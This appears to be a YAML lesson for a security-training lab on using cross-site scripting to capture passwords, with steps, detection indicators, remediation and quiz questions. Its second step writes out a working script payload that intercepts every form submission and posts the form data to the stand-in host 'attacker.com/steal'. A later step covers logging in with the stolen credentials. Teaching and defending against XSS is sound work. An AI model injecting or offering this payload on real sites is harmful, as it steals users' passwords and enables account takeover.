# Category: Cross-Site Scripting (XSS)
name: "Exploiting cross-site scripting to capture passwords"
id: "xss-capture-passwords-001"
category: "xss"
subcategory: "post_exploitation"
difficulty: "practitioner"
estimated_time: "45 minutes"

description: |
  This scenario covers using XSS to capture a victim's password by injecting
  a fake login form or listening to form submission events. The attacker can
  create a keylogger or a credential harvester that sends the credentials to
  an external server.

learning_objectives:
  - Understand how to capture form submissions via XSS
  - Inject a fake login form or overlay
  - Use `addEventListener` to intercept form submissions
  - Send captured credentials to an external server

tools:
  - Burp Suite
  - Browser developer tools
  - Python HTTP server

prerequisites:
  - XSS vulnerability identified
  - A server to receive captured credentials

steps:
  - id: "step1"
    phase: "setup"
    action: "Set up a listener for captured credentials"
    commands:
      - "# Start a Python server or use a simple PHP script"
    expected_output: "Server listening for POST requests"
    detection: "None"

  - id: "step2"
    phase: "exploitation"
    action: "Inject a payload to capture form submissions"
    commands:
      - "# Payload: <script>document.addEventListener('submit', function(e){ let formData = new FormData(e.target); fetch('http://attacker.com/steal', {method:'POST', body:formData}) });</script>"
      - "# Alternative: inject a fake login form overlay"
    expected_output: "Credentials captured and sent to attacker"
    detection: "Web server logs may show the payload"

  - id: "step3"
    phase: "post_exploitation"
    action: "Use captured credentials to log in"
    commands:
      - "# Use the captured credentials to authenticate"
    expected_output: "Access to victim's account"
    detection: "Login from unusual IP"

compliance_controls:
  - standard: "MITRE ATT&CK"
    control: "T1189"
    description: "Drive-by Compromise"
  - standard: "OWASP"
    control: "A03:2021"
    description: "Injection"

detection:
  network_indicators:
    - "POST requests to external domains with credentials"
  log_indicators:
    - "Web server logs with suspicious outbound requests"
  endpoint_indicators:
    - "None"

remediation:
  immediate:
    - "Prevent XSS vulnerabilities"
    - "Use multi-factor authentication"
  long_term:
    - "Educate users about phishing"
    - "Implement a Content Security Policy"

variables:
  attacker_server: "http://attacker.com/steal"

assessment_questions:
  - "How can an attacker use XSS to capture passwords?"
  - "What is the difference between stealing cookies and capturing passwords?"
  - "Why is MFA effective against password theft?"

references:
  - url: "https://owasp.org/www-community/attacks/xss/"
    title: "OWASP XSS"
  - url: "https://portswigger.net/web-security/cross-site-scripting/exploiting"
    title: "PortSwigger Exploiting XSS"